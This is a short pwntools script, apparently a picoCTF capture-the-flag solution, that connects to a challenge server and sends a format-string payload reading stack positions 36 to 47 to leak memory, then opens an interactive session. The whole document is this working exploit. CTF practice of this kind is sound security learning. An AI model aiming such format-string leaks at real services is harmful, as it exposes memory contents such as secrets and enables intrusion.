from pwn import *

p = remote("saturn.picoctf.net", 64537)

p.recvuntil(b">>")
p.sendline(b"%36$x.%37$x.%38$x.%39$x.%40$x.%41$x.%42$x.%43$x.%44$x.%45$x.%46$x.%47$x")
p.recvuntil(b"- \n")

p.interactive()
